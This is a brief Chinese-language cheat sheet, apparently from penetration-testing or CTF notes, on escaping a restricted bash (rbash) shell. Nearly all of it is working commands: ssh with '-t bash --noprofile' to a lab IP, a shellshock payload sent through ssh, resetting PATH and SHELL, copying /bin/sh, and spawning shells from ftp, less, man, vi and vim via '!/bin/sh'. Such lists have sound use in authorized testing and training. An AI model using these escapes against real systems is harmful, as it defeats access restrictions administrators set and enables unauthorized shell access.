# rbash 逃逸

[rbash 逃逸大全](https://xz.aliyun.com/t/7642)

1. 通过 ssh

```bash
# -t 增加伪终端 bash -- 表示传入bash的shell 不加载用户配置
sudo ssh seppuku @192.168.178.90 -p22 -t "bash --noprofile"
# 重写环境变量
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

- 逃逸：

```bash
su -l tw
su - tw
su --login tw
# ssh
ssh username@IP -t "/bin/sh" or "/bin/bash"
ssh username@IP -t "bash --noprofile"
ssh username@IP -t "() { :; }; /bin/bash"   ###shellshock

#　4.3、当前shell中逃逸
#　4.3.1 特殊情况支持以下
/bin/sh
/bin/bash
export PATH=$PATH:/bin/:/usr/bin:$PATH
export SHELL=/bin/sh
# 4.3.2 权限足够时
cp /bin/sh /path/ ;sh
cp /bin/bash /path/ ;sh
# 4.3.3 以下在输入的地方输入!/bin/sh 或 !/bin/bash
[1]ftp
[2]more
[3]less
[4]man
[5]vi
[6]vim

```
